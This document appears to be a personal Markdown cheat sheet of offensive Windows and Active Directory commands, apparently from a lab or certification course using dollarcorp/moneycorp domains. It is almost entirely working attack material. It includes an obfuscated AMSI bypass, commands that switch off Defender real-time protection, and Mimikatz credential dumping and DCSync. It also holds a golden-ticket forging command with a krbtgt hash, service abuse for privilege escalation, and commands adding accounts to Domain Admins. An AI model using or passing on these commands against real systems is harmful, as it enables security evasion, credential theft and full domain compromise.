---
description: Useful commands that comes in handy
---

# Command Pallette

### Bypass AMSI and Defender

BYPASS AMSI

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
# Bypass real time monitoring ( needs admin privs )
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

### Create PowerShell credentials and execute commands

```
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("CORP\john", $pass)

# Enter PSSession
Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred

# New-PSSession


# Invoke-command for command injection
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command {whoami}
```

### Command to check whoami after pass-the-hash attack

```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### Bypass Real-time Monitoring

```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableAutoExclusions $true
```

### Domain Admin Priv-Esc (local)

```
# Powerups
Invoke-Allchecks

# Abusing services
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student21'

# Run mimikatz
Invoke-Mimikatz
```

### Domain Admin Priv-Esc

```
# Local admin user
Find-LocalAdminAccess -Verbose
Invoke-UserHunter -CheckAccess -Verbose

# Enter session
$sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
$sess
Enter-PSSession -Session $sess

# language mode
$ExecutionContext.SessionState.LanguageMode

# applocker 
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Domain Admin Persistence

```
Invoke-Mimikatz

# note the rc4
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

### Extras

```
# Once you are DA add user to DA group
Invoke-Command -ScriptBlock {net group "DOMAIN ADMINS" studentX /domain /add} -ComputerName dcorp-dc.dollarcorp.moneycorp.local

C:> net localgroup Administrators student21 /add 
C:> net localgroup "Remote Desktop Users" student21 /add

https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
```

### Forest Priv-Esc

```
Invoke-Mimikatz

Invoke-Mimikatz -Command '"lsadump::trust /patch"'

Invoke-Mimikatz -Command '"lsadump::dcsync /domain:DOLLARCORP.MONEYCORP.LOCAL /all /csv"'

Invoke-Mimikatz -Command '"kerberos::golden /user:studentX /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'

gwmi -Class win32_computersystem -ComputerName mcorp-dc.moneycorp.local
```

### Some Queries that may come in handy

```
net localgroup administrators
# add to localgroup admins
net localgroup Administrators studentX /add 

# add to RDP group
net localgroup "Remote Desktop Users" studentX /add

# Add to DA 
net group "DOMAIN ADMINS" studentX /domain /add

# Checking First Degree Object Controls
# if the user is part of a group example sql admins and has generic all access we can do the following
net group "SQLMANAGERS" examAd /domain /add
```
